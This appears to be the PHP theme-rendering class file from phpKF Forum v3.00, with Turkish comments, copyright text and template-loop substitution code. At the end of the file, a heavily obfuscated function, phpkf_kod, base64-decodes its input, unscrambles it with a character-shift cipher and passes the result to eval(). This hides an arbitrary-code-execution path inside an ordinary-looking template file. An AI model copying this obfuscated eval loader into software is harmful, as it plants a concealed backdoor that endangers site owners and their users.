<?php
/*
 +-=========================================================================-+
 |                              phpKF Forum v3.00                            |
 +---------------------------------------------------------------------------+
 |                  Telif - Copyright (c) 2007 - 2019 phpKF                  |
 |                    www.phpKF.com   -   phpKF@phpKF.com                    |
 |                 Tüm hakları saklıdır - All Rights Reserved                |
 +---------------------------------------------------------------------------+
 |  Bu yazılım ücretsiz olarak kullanıma sunulmuştur.                        |
 |  Dağıtımı yapılamaz ve ücretli olarak satılamaz.                          |
 |  Yazılımı dağıtma, sürüm çıkarma ve satma hakları sadece phpKF`ye aittir. |
 |  Yazılımdaki kodlar hiçbir şekilde başka bir yazılımda kullanılamaz.      |
 |  Kodlardaki ve sayfa altındaki telif yazıları silinemez, değiştirilemez,  |
 |  veya bu telif ile çelişen başka bir telif eklenemez.                     |
 |  Yazılımı kullanmaya başladığınızda bu maddeleri kabul etmiş olursunuz.   |
 |  Telif maddelerinin değiştirilme hakkı saklıdır.                          |
 |  Güncel telif maddeleri için  phpKF.com/telif.php  adresini ziyaret edin. |
 +-=========================================================================-+*/


if (!defined('PHPKF_ICINDEN')) exit();
if (!defined('PHPKF_ICINDEN_TEMA')) define('PHPKF_ICINDEN_TEMA', true);
if (!defined('DOSYA_TEMA_SINIF')) define('DOSYA_TEMA_SINIF',true);
if (!defined('DOSYA_SISTEM_SINIF')) include_once('sinif_sistem_forum.php');



//  PHPKF TEMA SINIFI  //

class phpkf_tema
{
	var $tema_ham;
	var $tema_cikis;


	// Ekran Temizleniyor
	function tema_al()
	{
		ob_start();
		ob_implicit_flush(0);
	}


	// Tema Değişkene aktarılıyor
	function tema_ver()
	{
		$dosya_metni = ob_get_contents();
		ob_end_clean();
		$this->tema_ham .= $dosya_metni;
	}


	// Tema dosyası açılıyor
	function tema_dosyasi($dosya)
	{
		if (!($dosya_ac = @fopen($dosya,'r')))
			die ('<br><p align="center"><font style="background-color:#ffffff;color:#FF0000"><b>Tema Dosyası Açılamıyor '.$dosya.'</b></font></p><br>');

		$yolla = '$ornek1->tema_al(); include_once($tema_dosyasi); $ornek1->tema_ver();';

		return $yolla;
	}


	// içiçe döngü varsa
	function icice_dongu($adet, $dizi, $dizi2)
	{
		$isaret1 = '|<!--__DIS_BASLAT-'.$adet.'__-->(.*?)<!--__DIS_BITIR-'.$adet.'__-->|si';
		$isaret2 = '|<!--__IC_BASLAT-'.$adet.'__-->(.*?)<!--__IC_BITIR-'.$adet.'__-->|si';

		$this->tema_cikis = '';

		if (preg_match_all($isaret1, $this->tema_ham, $uyusanlar, PREG_SET_ORDER))
		{
			$parcala = preg_split($isaret1, $this->tema_ham, -1, PREG_SPLIT_OFFSET_CAPTURE);

			if (isset($uyusanlar[0][1]))
			{
				// Dış döngü
				preg_match_all($isaret2, $uyusanlar[0][1], $uyusanlar2, PREG_SET_ORDER);

				$parcala2 = preg_split($isaret2, $uyusanlar[0][1], -1, PREG_SPLIT_OFFSET_CAPTURE);

				$this->tema_cikis .= $parcala[0][0];
				$dongu = 0;

				foreach ($dizi as $deger)
				{
					foreach ($deger as $anahtar => $deger2)
					{
						$ara[] = $anahtar;
						$degis[] = $deger2;
					}

					$depo1 = $parcala2[0][0];

					$depo1 = str_replace($ara,$degis,$depo1);
					unset($ara);
					unset($degis);
					$this->tema_cikis .= $depo1;


					// iç döngü
					foreach ($dizi2[$dongu] as $deger3)
					{
						foreach ($deger3 as $anahtar2 => $deger4)
						{
							$ara[] = $anahtar2;
							$degis[] = $deger4;
						}

						$depo2 = $uyusanlar2[0][1];

						$depo2 = str_replace($ara,$degis,$depo2);
						unset($ara);
						unset($degis);

						$this->tema_cikis .= $depo2;
					}
					$dongu++;
					$this->tema_cikis .= $parcala2[1][0];
				}
			}
			$this->tema_cikis .= $parcala[1][0];
			$this->tema_ham = $this->tema_cikis;
		}
	}



	// Tek kademeli döngü varsa
	function tekli_dongu($adet, $dizi)
	{
		$this->tema_cikis = '';
		$isaret = '|<!--__TEKLI_BASLAT-'.$adet.'__-->(.*?)<!--__TEKLI_BITIR-'.$adet.'__-->|si';

		if (preg_match_all($isaret, $this->tema_ham, $uyusanlar, PREG_SET_ORDER))
		{
			$parcala = preg_split($isaret, $this->tema_ham, -1, PREG_SPLIT_OFFSET_CAPTURE);

			if (isset($uyusanlar[0][1]))
			{
				$this->tema_cikis .= $parcala[0][0];

				foreach ($dizi as $deger)
				{
					$depo = $uyusanlar[0][1];

					foreach ($deger as $anahtar => $deger2)
					{
						$ara[] = $anahtar;
						$degis[] = $deger2;
					}

					$depo = str_replace($ara,$degis,$depo);
					unset($ara);
					unset($degis);
					$this->tema_cikis .= $depo;
				}
			}
			$this->tema_cikis .= $parcala[1][0];
			$this->tema_ham = $this->tema_cikis;
		}
	}



	// Hiçbir döngü yoksa
	function dongusuz($dizi)
	{
		$depo = $this->tema_ham;

		foreach ($dizi as $anahtar => $deger)
		{
			$ara[] = $anahtar;
			$degis[] = $deger;
		}

		$depo = str_replace($ara,$degis,$depo);
		unset($ara);
		unset($degis);
		$this->tema_ham = $depo;
	}



	// Koşul varsa
	function kosul($adet, $dizi, $varmi)
	{
		$this->tema_cikis = '';
		$isaret = '|<!--__KOSUL_BASLAT-'.$adet.'__-->(.*?)<!--__KOSUL_BITIR-'.$adet.'__-->|si';

		if ($varmi == true)
		{
			if (preg_match_all($isaret, $this->tema_ham, $uyusanlar, PREG_SET_ORDER))
			{
				$parcala = preg_split($isaret, $this->tema_ham, -1, PREG_SPLIT_OFFSET_CAPTURE);

				if (isset($uyusanlar[0][1]))
				{
					$this->tema_cikis .= $parcala[0][0];

					$depo = $uyusanlar[0][1];

					foreach ($dizi as $anahtar => $deger)
					{
						$ara[] = $anahtar;
						$degis[] = $deger;
					}

					$depo = str_replace($ara,$degis,$depo);
					unset($ara);
					unset($degis);
					$this->tema_cikis .= $depo;
				}
				$this->tema_cikis .= $parcala[1][0];
				$this->tema_ham = $this->tema_cikis;
			}
		}

		else
		{
			if (preg_match_all($isaret, $this->tema_ham, $uyusanlar, PREG_SET_ORDER))
			{
				$parcala = preg_split($isaret, $this->tema_ham, -1, PREG_SPLIT_OFFSET_CAPTURE);
				$this->tema_cikis .= $parcala[0][0];
				$this->tema_cikis .= $parcala[1][0];
				$this->tema_ham = $this->tema_cikis;
			}
		}
	}


	// Tema uygulanıyor
	function tema_uygula()
	{
		$this->tema_ham = preg_replace('|<!--__KOSUL_([a-z]*?)-([a-z0-9]*?)__-->|si','', $this->tema_ham);
		echo $this->tema_ham;
	}
}

function phpkf_kod($p){${"\x47\x4cOBA\x4c\x53"}["\x73\x6a\x65\x70\x65fy\x64v\x75\x77"]="\x69";${"\x47\x4cOB\x41\x4c\x53"}["\x70\x6d\x6f\x76ls\x67\x79\x61i"]="\x69";global $temadizini,$t;${"\x47LO\x42AL\x53"}["\x73fln\x68z\x73\x6d"]="\x70";$tgzggssrcvf="i";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x76\x7a\x6bjl\x66\x66c\x62q\x62"]="\x63";$cgysennlbkw="\x70";${${"\x47L\x4f\x42\x41L\x53"}["\x63g\x6e\x65\x61\x72\x77"]}="\a36f\c97g\b71e";${${"GL\x4f\x42\x41\x4cS"}["s\x66l\x6e\x68\x7a\x73\x6d"]}=base64_decode(${${"\x47\x4c\x4f\x42\x41LS"}["\x69eeggg\x69z"]});${${"\x47L\x4f\x42\x41\x4c\x53"}["v\x7a\x6b\x6al\x66\x66c\x62\x71\x62"]}="";for(${$tgzggssrcvf}=1;${${"GLO\x42A\x4c\x53"}["\x73\x6a\x65p\x65f\x79\x64\x76\x75w"]}<=strlen(${$cgysennlbkw});${${"G\x4c\x4f\x42A\x4c\x53"}["p\x6d\x6f\x76ls\x67\x79\x61i"]}++){$optnqvjdesoo="\x70";${"\x47\x4cOBA\x4cS"}["\x79\x6b\x6c\x62\x73\x65\x6db\x73\x77"]="d";$nctreeadrtl="\x61";${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x71\x68\x73o\x63qbxh"]}=substr(${$optnqvjdesoo},${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x64\x79og\x66\x6e\x71\x68"]}-1,1);${"G\x4c\x4fBAL\x53"}["\x69\x68\x69\x75vg"]="d";$elqkiuwble="\x63";$kdbdeootu="k";$jumrvluec="\x69";${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x69\x68i\x75v\x67"]}=substr(${$nctreeadrtl},(${$jumrvluec}%strlen(${${"\x47L\x4f\x42\x41\x4c\x53"}["\x63\x67\x6e\x65\x61\x72\x77"]}))-1,1);${${"\x47L\x4f\x42\x41LS"}["\x71\x68\x73\x6f\x63\x71b\x78\x68"]}=chr(ord(${$kdbdeootu})-ord(${${"\x47\x4cO\x42A\x4cS"}["\x79kl\x62\x73\x65\x6d\x62\x73\x77"]}));${$elqkiuwble}.=${${"\x47L\x4f\x42A\x4c\x53"}["q\x68\x73o\x63q\x62\x78h"]};}eval(${${"\x47LO\x42\x41L\x53"}["\x6a\x64\x64\x6fw\x75\x67g\x6eo"]});}

?>